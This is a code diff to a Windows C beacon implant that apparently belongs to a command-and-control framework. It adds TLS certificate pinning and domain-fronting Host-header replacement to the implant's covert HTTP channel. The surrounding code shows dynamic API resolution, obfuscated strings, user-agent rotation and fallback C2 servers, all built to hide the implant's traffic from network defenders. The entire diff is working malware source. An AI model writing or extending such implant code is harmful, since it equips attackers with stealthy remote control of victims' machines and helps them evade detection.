@@ -27,6 +27,10 @@ pfnWinHttpReadData          pWinHttpReadData          = NULL;
 pfnWinHttpCloseHandle       pWinHttpCloseHandle       = NULL;
 pfnWinHttpSetOption         pWinHttpSetOption         = NULL;
 
+/* Optional — loaded without aborting BeaconInit if absent */
+static pfnWinHttpQueryOption        s_pWinHttpQueryOption        = NULL;
+static pfnWinHttpAddRequestHeaders  s_pWinHttpAddRequestHeaders  = NULL;
+
 /* ── UA rotation pool (matches Go agent UA pool) ─────────────────────────── */
 static const char *s_ua_pool[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
@@ -105,6 +109,12 @@ BOOL BeaconInit(void) {
     RESOLVE(WinHttpSetOption)
 #undef RESOLVE
 
+    /* Optional — cert pinning + domain fronting header override */
+    s_pWinHttpQueryOption       = (pfnWinHttpQueryOption)
+        (FARPROC)g_GetProcAddress(h, "WinHttpQueryOption");
+    s_pWinHttpAddRequestHeaders = (pfnWinHttpAddRequestHeaders)
+        (FARPROC)g_GetProcAddress(h, "WinHttpAddRequestHeaders");
+
     /* Copy primary server URL */
     xsnprintf(s_server_url, sizeof(s_server_url), "%s", CFG_SERVER_URL);
 
@@ -162,6 +172,53 @@ static void RotateServer(void) {
     xsnprintf(s_server_url, sizeof(s_server_url), "%s",
               s_fallback[s_fallback_idx % s_fallback_count]);
     s_fallback_idx++;
+}
+
+/* ── TLS certificate pinning ─────────────────────────────────────────────── */
+/*
+ * Queries the server's DER-encoded certificate from WinHTTP, SHA-256-hashes it,
+ * and compares against CFG_CERT_PIN (lowercase hex).  Returns TRUE if pin is
+ * empty (disabled) or if the fingerprint matches.  Returns FALSE on mismatch
+ * or if the cert cannot be retrieved.
+ *
+ * CERT_CONTEXT x64 layout (crypt32.h avoided to stay import-free):
+ *   +0   DWORD  dwCertEncodingType
+ *   +4   (padding)
+ *   +8   BYTE  *pbCertEncoded
+ *   +16  DWORD  cbCertEncoded
+ */
+static BOOL CheckCertPin(HINTERNET hRequest) {
+    if (!CFG_CERT_PIN[0]) return TRUE;
+    if (!s_pWinHttpQueryOption) return FALSE;
+
+    PVOID pCtx = NULL;
+    DWORD sz   = sizeof(pCtx);
+    if (!s_pWinHttpQueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCtx, &sz) || !pCtx)
+        return FALSE;
+
+    BYTE  *pbCert = *(BYTE**)((BYTE*)pCtx + 8);
+    DWORD  cbCert = *(DWORD*)((BYTE*)pCtx + 16);
+
+    BYTE hash[SHA256_LEN];
+    Sha256(pbCert, (SIZE_T)cbCert, hash);
+
+    /* Free cert context via crypt32 */
+    typedef BOOL (WINAPI *pfnCertFree_t)(PVOID);
+    HMODULE hCrypt = g_GetModuleHandleA(OBFSTR("crypt32.dll"));
+    if (!hCrypt) hCrypt = g_LoadLibraryA(OBFSTR("crypt32.dll"));
+    if (hCrypt) {
+        pfnCertFree_t pFree = (pfnCertFree_t)
+            (FARPROC)g_GetProcAddress(hCrypt, OBFSTR("CertFreeCertificateContext"));
+        if (pFree) pFree(pCtx);
+    }
+
+    /* Render computed fingerprint as lowercase hex and compare */
+    char computed[SHA256_LEN * 2 + 1];
+    for (int i = 0; i < SHA256_LEN; i++)
+        xsnprintf(computed + i * 2, 3, "%02x", (unsigned)hash[i]);
+    computed[SHA256_LEN * 2] = '\0';
+
+    return (strcmp(computed, CFG_CERT_PIN) == 0);
 }
 
 /* ── HTTP POST helper ────────────────────────────────────────────────────── */
@@ -228,12 +285,22 @@ static char *HttpPost(const char *url, const char *ua,
         pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
     }
 
-    /* Build header string: Content-Type + profile headers + Host (if fronting) */
+    /* Domain fronting: override Host header via WinHttpAddRequestHeaders REPLACE
+     * so the real C2 hostname overwrites WinHTTP's auto-generated Host header
+     * (which would otherwise name the front CDN domain). */
+    if (CFG_FRONT_DOMAIN[0] && s_pWinHttpAddRequestHeaders) {
+        char  hostHdrA[300];
+        WCHAR hostHdrW[300] = {0};
+        xsnprintf(hostHdrA, sizeof(hostHdrA), "Host: %s", realHostA);
+        StrToWstr(hostHdrA, hostHdrW, 300);
+        s_pWinHttpAddRequestHeaders(hRequest, hostHdrW, (DWORD)-1L,
+                                    WINHTTP_ADDREQS_FLAG_REPLACE);
+    }
+
+    /* Build Content-Type + profile headers */
     char hdrA[512];
-    int hlen = xsnprintf(hdrA, sizeof(hdrA), "Content-Type: %s\r\n%s",
-                         s_active_profile->ct, s_active_profile->headers);
-    if (CFG_FRONT_DOMAIN[0] && hlen > 0 && hlen < (int)sizeof(hdrA) - 64)
-        xsnprintf(hdrA + hlen, sizeof(hdrA) - hlen, "Host: %s\r\n", realHostA);
+    xsnprintf(hdrA, sizeof(hdrA), "Content-Type: %s\r\n%s",
+              s_active_profile->ct, s_active_profile->headers);
     WCHAR hdrW[1024] = {0};
     StrToWstr(hdrA, hdrW, 1024);
 
@@ -244,6 +311,9 @@ static char *HttpPost(const char *url, const char *ua,
         goto done;
 
     if (!pWinHttpReceiveResponse(hRequest, NULL)) goto done;
+
+    /* Cert pinning — abort if fingerprint doesn't match CFG_CERT_PIN */
+    if (https && !CheckCertPin(hRequest)) goto done;
 
     /* Read response into heap buffer */
     DWORD avail = 0, read = 0, totalRead = 0;
